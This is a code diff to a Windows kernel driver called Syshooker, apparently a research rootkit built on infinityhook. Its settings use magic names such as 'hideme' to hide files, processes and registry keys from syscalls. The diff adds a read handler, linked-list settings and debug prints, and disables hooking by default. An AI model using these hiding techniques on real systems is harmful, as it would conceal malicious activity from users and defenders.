@@ -21,12 +21,20 @@
 #include "../Syshooker-Client/SyshookerCommon.h"
 #include "Settings.h"
 
+// old settings - delete
 SyshookerSettings Settings = {
 	L"hideme",		// NtCreateFileMagicName
 	L"wassup",		// NtWriteFileMagicName
 	L"hideme",		// NtQueryDirectoryFileExMagicName
 	L"hideme.exe",	// NtQuerySystemInformationProcessMagicName
 	L"hideme",		// RegistryKeyMagicName
+};
+
+// new settings - empty linked lists by default
+SyshookerSettingsNew SettingsNew = {
+	nullptr, // FileMagicNamesHead
+	nullptr, // ProcessMagicNamesHead
+	nullptr  // RegistryMagicNamesHead
 };
 
 // Hooked Syscalls
@@ -45,6 +53,7 @@ UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Syshooker");
 
 NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp);
+NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 
 char CALLBACK_OVERWRITE_ENABLED = 0;
 
@@ -60,6 +69,7 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = SyshookerCreateClose;
 	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SyshookerCreateClose;
 	DriverObject->MajorFunction[IRP_MJ_WRITE] = SyshookerWrite;
+	DriverObject->MajorFunction[IRP_MJ_READ] = SyshookerRead;
 
 	// Device name
 	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\Syshooker");
@@ -71,6 +81,8 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 		KdPrint(("Failed to create device object (0x%08X)\n", status));
 		return status;
 	}
+	kprintf("[+] syshooker DeviceObject address: %p\n", DeviceObject);
+	//kprintf("[+] syshooker DriverUnload address: %p\n", DriverUnload);
 	
 	status = IoCreateSymbolicLink(&symLink, &deviceName);
 	if (!NT_SUCCESS(status)) {
@@ -211,7 +223,7 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	}
 	else
 	{
-		CALLBACK_OVERWRITE_ENABLED = 1;
+		//CALLBACK_OVERWRITE_ENABLED = 1; // TODO - uncomment here to start hooking
 	}
 	
 	return Status;
@@ -221,6 +233,7 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 *	Turns off infinity hook.
 */
 void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
+	kprintf("[!] infinityhook: Unload invoked...\n");
 	UNREFERENCED_PARAMETER(DriverObject);
 
 	CALLBACK_OVERWRITE_ENABLED = 0;
@@ -230,8 +243,11 @@ void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
 	//
 	IfhRelease();
 
+	kprintf("[!] infinityhook: Unload - after IfhRelease...\n");
+
 	// Release driver resources (symlink, device object)
 	IoDeleteSymbolicLink(&symLink);
+	kprintf("[!] infinityhook: Unload - after delete symbolic...\n");
 	IoDeleteDevice(DriverObject->DeviceObject);
 
 	kprintf("\n[!] infinityhook: Unloading... BYE!\n");
@@ -334,6 +350,8 @@ NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 }
 
 NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
+	kprintf("[+] syshooker IRQ_WRITE - we are here!\n");
+	UNREFERENCED_PARAMETER(DeviceObject);
 	NTSTATUS status = STATUS_SUCCESS; // initially define status as success
 	ULONG_PTR information = 0; // used bytes to return back to client
 
@@ -341,32 +359,77 @@ NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
 
 	do {
-		if (irpSp->Parameters.Write.Length < sizeof(WriteHookData)) {
+		if (irpSp->Parameters.Write.Length < sizeof(SyshookerApiWriteRequest)) {
 			status = STATUS_BUFFER_TOO_SMALL;
 			break;
 		}
 
-		// make data buffer accessible as ThreadData pointer
-		WriteHookData* data = static_cast<WriteHookData*>(Irp->UserBuffer);
+		// make data buffer accessible as SyshookerApiWriteRequest structure pointer
+		SyshookerApiWriteRequest* request = static_cast<SyshookerApiWriteRequest*>(Irp->UserBuffer);
 
-		// check nullptr and valid values
-		if (data == nullptr || data->BufferLength <= 0 || data->BufferLength > MAX_PATH_SYSHOOKER) {
-			if (data != nullptr)
-				KdPrint(("BufferLength is probably wrong (%d). (0x%08X)\n", data->BufferLength, status));
+		// check buffer for nullptr and NameLength
+		if (request == nullptr || request->NameLength <= 0) {
+			//kprintf("[-] syshooker IRQ_WRITE: Request buffer (%p) or length invalid.\n", request);
 
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
 		// print the buffer in kernel
-		kprintf("[+] infinityhook: Syshooker IRP Write: %ws.\n", data->NameBuffer);
-		if (wcscpy_s(Settings.NtWriteFileMagicName, MAX_PATH_SYSHOOKER, data->NameBuffer) != 0) {
-			status = STATUS_INVALID_PARAMETER;
-		}
+		kprintf("[+] syshooker IRQ_WRITE: NameBuffer: %ws.\n", request->NameBuffer);
+
+		//if (wcscpy_s(Settings.NtWriteFileMagicName, MAX_PATH_SYSHOOKER, request->NameBuffer) != 0) {
+		//	status = STATUS_INVALID_PARAMETER;
+		//}
 		
 
 		// return data used
-		information = sizeof(*data);
+		information = sizeof(*request);
+	} while (FALSE);
+
+	// complete IRP
+	kprintf("[+] syshooker IRQ_WRITE - gonna complete now!\n");
+	Irp->IoStatus.Status = status; // whatever status that is currently set
+	Irp->IoStatus.Information = information;
+	IoCompleteRequest(Irp, IO_NO_INCREMENT);
+	kprintf("[+] syshooker IRQ_WRITE - before return\n");
+	CALLBACK_OVERWRITE_ENABLED = 0;
+	return status;
+}
+
+NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
+	kprintf("[+] syshooker IRQ_READ called\n");
+	UNREFERENCED_PARAMETER(DeviceObject);
+	NTSTATUS status = STATUS_SUCCESS; // initially define status as success
+	ULONG_PTR information = 0; // used bytes to return back to client
+
+	// get stack location of IRP
+	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
+
+	do {
+		if (irpSp->Parameters.Read.Length < 1024) {
+			status = STATUS_BUFFER_TOO_SMALL;
+			kprintf("[-] syshooker IRQ_READ: Buffer too small\n");
+			break;
+		}
+
+		// make data buffer accessible
+		char* data = static_cast<char*>(Irp->UserBuffer);
+
+		// check nullptr
+		if (data == nullptr) {
+			kprintf("[-] syshooker IRQ_READ: Data cannot be nullptr.\n");
+
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		for (char i = 0; i < 10; ++i) {
+			data[i] = 'A' + i;
+			information++;
+		}
+		kprintf("[+] syshooker IRQ_READ: Buffer after population: %s\n", data);
+
 	} while (FALSE);
 
 	// complete IRP
